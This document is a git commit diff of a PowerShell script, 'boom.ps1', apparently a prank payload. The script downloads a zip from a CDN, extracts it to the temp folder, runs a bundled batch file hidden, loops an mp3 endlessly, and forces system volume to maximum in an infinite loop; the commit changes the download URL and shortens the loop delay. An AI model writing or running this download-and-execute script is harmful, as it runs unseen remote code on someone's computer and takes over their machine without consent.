04beae1374ce3ef97fd8e258052bae46b74792fe
l4l4l4l4ll <68412637+l4l4l4l4ll@users.noreply.github.com>
2023-05-18 17:53:07 +1000

    Add files via upload

--- loud/boom.ps1
+++ loud/boom.ps1
@@ -1,9 +1,9 @@
-Invoke-WebRequest https://cdn.statically.io/gh/l4l4l4l4ll/files/896137bc05bce0f01933fb356d30568eb8ada99c/loud/boom.zip -OutFile $env:temp\boom.zip
+Invoke-WebRequest https://cdn.statically.io/gh/l4l4l4l4ll/files/99eadabcb5437c1449a4d27cd2816621932d19d6/loud/boom.zip -OutFile $env:temp\boom.zip
 Expand-Archive -Force -Path $env:temp\boom.zip -DestinationPath $env:temp\boom
 Start-Process -FilePath "$env:temp/boom/boom.bat" -WindowStyle Hidden
 Start-Process -FilePath "$env:temp/boom/mpg123.exe" -WindowStyle Hidden -ArgumentList "--loop -1 $env:temp/boom/boom.mp3"
 while ($true) {
   Start-Process -FilePath "$env:temp/boom/nircmd.exe" -WindowStyle Hidden -ArgumentList "mutesysvolume 0"
   Start-Process -FilePath "$env:temp/boom/nircmd.exe" -WindowStyle Hidden -ArgumentList "setsysvolume 65535"
-  Start-Sleep -Seconds 1
+  Start-Sleep -Seconds 0.5
 }
